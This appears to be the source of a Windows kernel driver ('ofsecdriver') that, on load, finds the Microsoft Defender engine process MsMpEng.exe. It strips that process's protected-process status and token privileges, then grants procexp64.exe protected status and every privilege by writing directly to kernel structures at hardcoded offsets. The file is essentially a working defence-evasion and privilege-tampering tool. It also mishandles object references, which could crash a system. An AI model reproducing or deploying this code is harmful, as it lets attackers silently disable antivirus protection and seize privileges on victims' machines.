#include <Ntifs.h>
#include <ntddk.h>
#include "ioctl.h"
#include <Windef.h>

void DriverClean(PDRIVER_OBJECT DriverObject);
UNICODE_STRING  deviceName = RTL_CONSTANT_STRING(L"\\Device\\ofsecdriver");
UNICODE_STRING  syymlink = RTL_CONSTANT_STRING(L"\\??\\ofsecdriver");
PVOID allocone;
NTSTATUS CreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

typedef struct _PS_PROTECTION {
	UCHAR Type : 3;
	UCHAR Audit : 1;
	UCHAR Signer : 4;
} PS_PROTECTION, * PPS_PROTECTION;
typedef struct _PROCESS_PROTECTION_INFO {
	UCHAR SignatureLevel;
	UCHAR SectionSignatureLevel;
	PS_PROTECTION Protection;
} PROCESS_PROTECTION_INFO, *PPROCESS_PROTECTION_INFO;
typedef enum _WINDOWS {
	WINDOWS_22H2,
	WINDOWS_UNSUPPORTED,
	WINDOWS_REDSTONE_1,
	WINDOWS_REDSTONE_2,
	WINDOWS_REDSTONE_3,
	WINDOWS_REDSTONE_4,
	WINDOWS_REDSTONE_5,
	WINDOWS_19H1,
	WINDOWS_19H2,
	WINDOWS_20H1,
	WINDOWS_20H2,
	WINDOWS_21H1,
	WINDOWS_21H2,
	WINDOWS_22H1,
}WINDOWS_VERSION, *PWINDOWS_VERSION;
typedef struct _PROCESS_PRIVILEGES {
	UCHAR Present[8];
	UCHAR Enabled[8];
	UCHAR EnabledByDefault[8];
} PROCESS_PRIVILEGES,  * PPROCESS_PRIVILEGES;
const ULONG PROCESS_PRIVILEGE_OFFSET[]{
	0x40,
	0x40,
	0x40,
	0x40,
	0x40,
	0x40,
	0x40,
	0x40,
	0x40,
	0x40,
	0x40,
	0x40,
};

char* processnameunprotect[1] = { "MsMpEng.exe" };
char* processnameprotect[1] = { "procexp64.exe" };

WINDOWS_VERSION
GetWindowsVersion() {
	RTL_OSVERSIONINFOW info;
	info.dwOSVersionInfoSize = sizeof(info);
	NTSTATUS status = RtlGetVersion(&info);
	if (!NT_SUCCESS(status)) {
		DbgPrint("[!] Failed RtlGetVersion (0x%08X)\n", status);
		return WINDOWS_UNSUPPORTED;
	}

	DbgPrint("[+] Windows Version %d.%d\n",info.dwMajorVersion,info.dwBuildNumber);
	if (info.dwMajorVersion != 10) {
		return WINDOWS_UNSUPPORTED;
	}

	switch (info.dwBuildNumber) {
	case 17763:
		return WINDOWS_REDSTONE_5;
	case 19045:
		return WINDOWS_22H2;
	default:
		return WINDOWS_UNSUPPORTED;
	}
}
const ULONG PROCESS_PROTECTION_OFFSET[] = {
	0x878,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x6c8,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
};

HANDLE get_process_id_by_name(CHAR* process_name)
{
	DbgPrint("[+] Called GetProcessidbyname\n");
	CHAR image_name[15];
	PEPROCESS sys_process = PsInitialSystemProcess;
	PEPROCESS cur_entry = sys_process;
	do
	{	
		RtlCopyMemory((PVOID)(&image_name), (PVOID)((uintptr_t)cur_entry + ImageFileName), sizeof(image_name));
		if (strstr(image_name, process_name) != NULL)
		{
			DWORD active_threads;
			RtlCopyMemory((PVOID)&active_threads, (PVOID)((uintptr_t)cur_entry + ActiveThreads), sizeof(active_threads));
			if (active_threads)
			{
				HANDLE process_handle = PsGetProcessId(cur_entry);
				DWORD process_id = HandleToULong(process_handle);
				DbgPrint("[+] Found process with name %s and PID %lu\n", process_name, process_id);
				return (HANDLE)process_id;
			}
		}
		PLIST_ENTRY list = (PLIST_ENTRY)((uintptr_t)(cur_entry)+ActiveProcessLinks);
		cur_entry = (PEPROCESS)((uintptr_t)list->Flink - ActiveProcessLinks);

	} while (cur_entry != sys_process);
	return 0;
}

extern "C"
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);
	DbgPrint("[+] Starting\n");
	DriverObject->DriverUnload = DriverClean;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;

	PDEVICE_OBJECT devObj;
	NTSTATUS devstatus = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &devObj);
	if (!NT_SUCCESS(devstatus)) {
		DbgPrint("[!] Failed to create device object (0x%08X)\n",devstatus);
		return devstatus;
	}
	devstatus = IoCreateSymbolicLink(&syymlink, &deviceName);
	if (!NT_SUCCESS(devstatus)) {
		DbgPrint("[!] Failed to create symlink (0x%08X)\n", devstatus);
		IoDeleteDevice(devObj);
		return devstatus;
	}
	WINDOWS_VERSION winver = GetWindowsVersion();
	if (winver == WINDOWS_UNSUPPORTED) {
		DbgPrint("[!] Windows version not supported\n");
	}
	for (int i = 0;i<sizeof(processnameunprotect)/sizeof(*processnameunprotect);++i){
		DbgPrint("[+] Unprotecting %s\n", processnameunprotect[i]);
		PEPROCESS eProcess = NULL;
		NTSTATUS status = PsLookupProcessByProcessId((HANDLE)get_process_id_by_name(processnameunprotect[i]), &eProcess); 
		if (!NT_SUCCESS(status)) {
			DbgPrint("[!] Failed to pslookup (0x%08X)\n", status);
			return status;
		}
		else {
			DbgPrint("[+] Pslookup Succeded (0x%08X)\n", status);
			PROCESS_PROTECTION_INFO* psProtecion = (PROCESS_PROTECTION_INFO*)(((ULONG_PTR)eProcess) + PROCESS_PROTECTION_OFFSET[winver]);  /*PROCESS_PROTECTION_OFFSET[winver]*/
			psProtecion->SignatureLevel = 0;
			psProtecion->SectionSignatureLevel = 0;
			psProtecion->Protection.Type = 0;
			psProtecion->Protection.Signer = 0;
			ObDereferenceObject(eProcess);
			DbgPrint("[+] Protection removed\n");
			DbgPrint("[+] Modifing Token\n");
			PACCESS_TOKEN pToken = PsReferencePrimaryToken(eProcess);
			PsDereferenceImpersonationToken(pToken);
			ObDereferenceObject(eProcess);
			PPROCESS_PRIVILEGES tokenPrivs = (PPROCESS_PRIVILEGES)((ULONG_PTR)pToken + PROCESS_PRIVILEGE_OFFSET[winver]);
			tokenPrivs->Present[0] = tokenPrivs->Enabled[0] = 0x00;
			tokenPrivs->Present[1] = tokenPrivs->Enabled[1] = 0x00;
			tokenPrivs->Present[2] = tokenPrivs->Enabled[2] = 0x00;
			tokenPrivs->Present[3] = tokenPrivs->Enabled[3] = 0x00;
			tokenPrivs->Present[4] = tokenPrivs->Enabled[4] = 0x00;
			DbgPrint("[+] Privileges Removed\n");
		}
	}

	for (int i = 0; i < sizeof(processnameprotect)/ sizeof(*processnameprotect); ++i) {
		DbgPrint("[+] Protecting %s\n", processnameprotect[i]);
		PEPROCESS eProcess = NULL;
		NTSTATUS status = PsLookupProcessByProcessId((HANDLE)get_process_id_by_name(processnameprotect[i]), &eProcess);
		if (!NT_SUCCESS(status)) {
			DbgPrint("[!] Failed to pslookup (0x%08X)\n", status);
			return status;
		}
		else {
			PROCESS_PROTECTION_INFO* psProtecion = (PROCESS_PROTECTION_INFO*)(((ULONG_PTR)eProcess) + PROCESS_PROTECTION_OFFSET[winver]);
			psProtecion->SignatureLevel = 30;
			psProtecion->SectionSignatureLevel = 28;
			psProtecion->Protection.Type = 2;
			psProtecion->Protection.Signer = 6;
			DbgPrint("[+] Protection Added\n");
			DbgPrint("[+] Modifing Token\n");
			PACCESS_TOKEN pToken = PsReferencePrimaryToken(eProcess);
			PsDereferenceImpersonationToken(pToken);
			ObDereferenceObject(eProcess);
			PPROCESS_PRIVILEGES tokenPrivs = (PPROCESS_PRIVILEGES)((ULONG_PTR)pToken + PROCESS_PRIVILEGE_OFFSET[winver]);
			tokenPrivs->Present[0] = tokenPrivs->Enabled[0] = 0xff;
			tokenPrivs->Present[1] = tokenPrivs->Enabled[1] = 0xff;
			tokenPrivs->Present[2] = tokenPrivs->Enabled[2] = 0xff;
			tokenPrivs->Present[3] = tokenPrivs->Enabled[3] = 0xff;
			tokenPrivs->Present[4] = tokenPrivs->Enabled[4] = 0xff;
			DbgPrint("[+] Privileges Added\n");


		}
	}


	return STATUS_SUCCESS;
}

void DriverClean(PDRIVER_OBJECT DriverObject) {
	UNREFERENCED_PARAMETER(DriverObject);
	DbgPrint("[+] Freeing\n");
	IoDeleteSymbolicLink(&syymlink);
	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS
CreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = STATUS_SUCCESS;
	ULONG_PTR lenght = 0;
	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case FIRST_DRIVER_IOCTL_ONE:
		DbgPrint("[+] FIRST called\n");
		break;
	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		DbgPrint("[!] INVALIDDEV REQUEST\n");
		break;
	}
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = lenght;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}
